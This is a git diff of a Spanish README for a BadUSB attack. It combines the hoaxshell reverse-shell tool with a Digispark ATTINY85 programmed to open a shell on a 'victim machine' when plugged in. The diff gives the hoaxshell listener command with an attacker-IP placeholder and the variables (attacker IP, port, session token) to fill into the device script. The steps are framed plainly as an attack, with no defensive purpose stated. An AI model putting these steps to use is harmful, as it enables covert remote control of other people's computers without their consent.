@@ -31,7 +31,7 @@ git clone https://github.com/t3l3machus/hoaxshell
 
 ## 🚀 Uso
 
-### 1. Ejecutar Hoaxshell.py, copiar el token generado en $i y dejar ejecutandose
+### 1. Ejecutar Hoaxshell.py, copiar el token generado en $i y dejar ejecutandose.
 ```python
 python3 ./hoaxshell.py -s IP_ATACANTE -r -H 'Authorization'
 ```
@@ -41,20 +41,22 @@ python3 ./hoaxshell.py -s IP_ATACANTE -r -H 'Authorization'
 ### 2. Abrir Arduino y seleccionar Digispark 16.5 Board.
 <img width="858" height="131" alt="imagen" src="https://github.com/user-attachments/assets/3de241e0-7181-44e2-aa3a-a96a26e3e4c1" />
 
-### 3. Abrir Arduino y seleccionar Digispark 16.5 Board.
+### 3. Dentro de Arduino, abrir el archivo .ino que se encuentra en la carpeta script del repositorio y modificar las siguientes variables:
 
 
-- IP_AND_PORT_ATTACKER: Pegar tu IP y puerto de maquina atacante
-- TOKEN: Pegar el token generado por hoaxshell
-- TOKEN_PART1: Pegar primera parte del token
-- TOKEN_PART2: Pegar segunda parte del token
-- TOKEN_PART3: Pegar tercera parte del token
+- IP_AND_PORT_ATTACKER: Reemplazar por tu IP y puerto de atacante
+- TOKEN: Reemplazar por el token generado por hoaxshell
+- TOKEN_PART1: Reemplazar con la primera parte del token
+- TOKEN_PART2: Reemplazar con la segunda parte del token
+- TOKEN_PART3: Reemplazar con la tercera parte del token
 
 ![image](https://github.com/user-attachments/assets/9418035f-eaa7-4b05-ae3b-a7bd19dd68d6)
 
 
 
-### 3) Compilar y cargar a nuestro ATTINY-85 en la misma interfaz de Arduino
+### 3) Compilar el script y conectar el ATTINY 85. Una vez hecho esto, el USB estara listo para el ataque.
+<img width="2531" height="1378" alt="imagen" src="https://github.com/user-attachments/assets/6d478ecd-7554-4342-a291-28438e7848d8" />
+
 
 ### 4) Conectar el dispositivo a la máquina victima y esperamos la respuesta en nuestra máquina de atacante.
 
